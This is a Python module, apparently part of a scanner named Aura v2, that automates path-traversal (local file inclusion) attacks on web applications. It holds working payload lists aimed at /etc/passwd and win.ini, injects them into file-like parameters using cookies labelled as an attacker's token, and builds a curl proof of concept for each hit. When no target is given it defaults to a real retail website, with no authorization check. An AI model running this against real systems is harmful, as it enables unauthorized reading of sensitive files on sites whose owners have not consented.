"""
Aura v2 — Path Traversal (LFI) Engine
=====================================
Detects arbitrary file reads by injecting path traversal payloads into
file-related parameters.

Vectors targeted:
  - Linux: /etc/passwd via ../../../, null bytes, URL encoding
  - Windows: C:\\Windows\\win.ini via ..\\..\\..\\

Usage:
    aura www.target.com --lfi
    aura www.target.com --lfi --map reports/discovery_map_target.json
"""

import asyncio
import json
import os
import re
import urllib.parse
from datetime import datetime
from pathlib import Path
from typing import Optional

import httpx
import urllib3
urllib3.disable_warnings()

from rich.console import Console
from rich.panel import Panel
from rich import box

from aura.ui.formatter import console

# ─── Configuration & Payloads ────────────────────────────────────────────────

LFI_PARAMS = {
    "file", "path", "folder", "dir", "document", "src", "image", 
    "template", "include", "page", "view", "load", "download", 
    "read", "url", "doc"
}

PAYLOADS = {
    "Linux": {
        "signature": re.compile(r"root:x:0:0:", re.IGNORECASE),
        "impact": "Arbitrary File Read — Attacker can read sensitive Unix files (/etc/passwd, .env, SSH keys).",
        "severity": "HIGH",
        "cvss": 7.5,
        "payloads": [
            "../../../../../../../../../../etc/passwd",
            "....//....//....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "../../../../../../../../../../etc/passwd%00.jpg",
            "/etc/passwd",
            "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
        ]
    },
    "Windows": {
        "signature": re.compile(r"\[extensions\]|\[fonts\]", re.IGNORECASE),
        "impact": "Arbitrary File Read — Attacker can read sensitive Windows files (win.ini, web.config).",
        "severity": "HIGH",
        "cvss": 7.5,
        "payloads": [
            "../../../../../../../../../../Windows/win.ini",
            "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\Windows\\win.ini",
            "..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cWindows%5cwin.ini",
            "C:\\Windows\\win.ini",
        ]
    }
}


class LFIEngine:
    """
    Automated Path Traversal / LFI vulnerability detection engine.
    """
    def __init__(self, target: str, cookies_str: str, output_dir: str = "./reports", timeout: int = 15):
        if not target.startswith("http"):
            target = "https://" + target
        self.target = target.rstrip("/")
        self.target_domain = urllib.parse.urlparse(self.target).netloc
        self.cookies = self._parse_cookies(cookies_str)
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.timeout = timeout
        self.findings: list[dict] = []
        self.tested: set[str] = set()

    @staticmethod
    def _parse_cookies(cookie_str: str) -> dict:
        cookies = {}
        for part in (cookie_str or "").split(";"):
            part = part.strip()
            if "=" in part:
                k, _, v = part.partition("=")
                cookies[k.strip()] = v.strip()
        return cookies

    def _request(self, method: str, url: str) -> Optional[httpx.Response]:
        try:
            return httpx.request(
                method=method,
                url=url,
                cookies=self.cookies,
                timeout=self.timeout,
                verify=False,
                follow_redirects=True, # LFI often sits behind redirects
                headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
            )
        except Exception:
            return None

    def _inject_param(self, url: str, param: str, payload: str) -> str:
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [payload]
        new_query = urllib.parse.urlencode(params, doseq=True)
        return parsed._replace(query=new_query).geturl()

    def _extract_params(self, discovery_map: dict) -> list[dict]:
        """Extracts injectable URL parameters that look like file inputs."""
        all_calls = (
            discovery_map.get("all_api_calls", []) +
            discovery_map.get("idor_candidates", []) +
            discovery_map.get("mutating_endpoints", [])
        )

        injectable = []
        seen = set()

        for call in all_calls:
            url = call.get("url", "")
            if not url: continue

            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)

            for param_name, values in params.items():
                if param_name.lower() in LFI_PARAMS:
                    key = (parsed.path, param_name)
                    if key not in seen:
                        seen.add(key)
                        injectable.append({
                            "url": url,
                            "method": call.get("method", "GET"),
                            "param": param_name,
                            "original_value": values[0] if values else "",
                        })
        return injectable

    def _build_finding(self, param_info: dict, result: dict) -> dict:
        return {
            "type": "Path Traversal (LFI)",
            "url": param_info["url"],
            "param": param_info["param"],
            "http_method": param_info["method"],
            "payload": result["payload"],
            "os_target": result["os_target"],
            "severity": result["severity"],
            "cvss_score": result["cvss"],
            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
            "impact": result["impact"],
            "owasp": "A01:2021 — Broken Access Control",
            "snippet": result.get("snippet", ""),
            "poc_curl": (
                "curl -sk '{}' -b '{}'".format(
                    self._inject_param(param_info['url'], param_info['param'], result['payload']),
                    "; ".join(f"{k}={v}" for k, v in list(self.cookies.items())[:2])
                )
            ),
            "timestamp": datetime.utcnow().isoformat(),
        }

    def _test_lfi(self, url: str, param: str) -> Optional[dict]:
        """Injects LFI payloads and checks response."""
        for os_type, data in PAYLOADS.items():
            for payload in data["payloads"]:
                injected_url = self._inject_param(url, param, payload)
                resp = self._request("GET", injected_url)
                
                if resp and resp.status_code == 200:
                    if data["signature"].search(resp.text):
                        return {
                            "payload": payload,
                            "os_target": os_type,
                            "severity": data["severity"],
                            "cvss": data["cvss"],
                            "impact": data["impact"],
                            "snippet": resp.text[:300].strip() # grab a snippet to prove it
                        }
        return None

    def run(self, discovery_map: dict) -> list[dict]:
        params = self._extract_params(discovery_map)
        meta = discovery_map.get("meta", {})
        
        # Add common dynamic routing bases just to be thorough
        extra_paths = ["/download", "/view", "/image", "/page", "/file"]
        for p in extra_paths:
            for param in ["file", "path", "src", "document"]:
                params.append({
                    "url": f"{self.target}{p}?{param}=example.jpg",
                    "method": "GET",
                    "param": param,
                    "original_value": "example.jpg"
                })

        print(f"\n{'='*65}")
        print(f"📂 AURA v2 — Path Traversal (LFI) Engine")
        print(f"🎯 Target: {meta.get('target', self.target)}")
        print(f"💉 Parameters to Test: {len(params)} (file, path, template, etc.)")
        print(f"{'='*65}")

        if not params:
            print("\n⚠️  No LFI-friendly parameters found in discovery map.")
            print("   Tip: Run --crawl first.")
            return []

        for param_info in params:
            url = param_info["url"]
            param = param_info["param"]
            key = f"{urllib.parse.urlparse(url).path}::{param}"
            if key in self.tested:
                continue
            self.tested.add(key)

            print(f"\n  🔍 [{param_info['method']}] [{param}] in {url[:70]}")

            res = self._test_lfi(url, param)
            if res:
                print(f"     🚨 HIGH: LFI Detected! ({res['os_target']}) Payload: {res['payload']}")
                self.findings.append(self._build_finding(param_info, res))
            else:
                print(f"     ✅ Safe")

        return self._finalize()

    def _finalize(self) -> list[dict]:
        critical = [f for f in self.findings if f.get("severity") == "CRITICAL"]
        high     = [f for f in self.findings if f.get("severity") == "HIGH"]
        medium   = [f for f in self.findings if f.get("severity") == "MEDIUM"]

        print(f"\n{'='*65}")
        print(f"✅ LFI SCAN COMPLETE")
        print(f"{'='*65}")
        print(f"  🔴 Critical : {len(critical)}")
        print(f"  🟠 High     : {len(high)}")
        print(f"  🟡 Medium   : {len(medium)}")
        print(f"  📊 Total    : {len(self.findings)}")

        if self.findings:
            target_slug = self.target_domain.replace(".", "_").replace("www_", "")
            out_path = self.output_dir / f"lfi_findings_{target_slug}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            with open(out_path, "w", encoding="utf-8") as fh:
                json.dump({"target": self.target, "findings": self.findings}, fh, indent=2)
            print(f"\n  💾 Findings saved: {out_path}")
        else:
            print("\n  ✅ No LFI vulnerabilities detected.")

        return self.findings


def run_lfi_scan(target: str, discovery_map_path: Optional[str] = None) -> list[dict]:
    """CLI runner for `aura <target> --lfi`."""
    from dotenv import load_dotenv
    load_dotenv()

    cookies_str = os.getenv("AUTH_TOKEN_ATTACKER", "")
    
    if not discovery_map_path:
        target_slug = target.replace("www.", "").replace(".", "_")
        candidate = Path(f"./reports/discovery_map_{target_slug}.json")
        if candidate.exists():
            discovery_map_path = str(candidate)

    discovery_map = {}
    if discovery_map_path:
        try:
            with open(discovery_map_path, encoding="utf-8-sig") as f:
                discovery_map = json.load(f)
        except Exception as e:
            console.print(f"[red]Error loading map: {e}[/red]")

    engine = LFIEngine(target=target, cookies_str=cookies_str)
    return engine.run(discovery_map)


if __name__ == "__main__":
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else "www.iciparisxl.nl"
    run_lfi_scan(target)
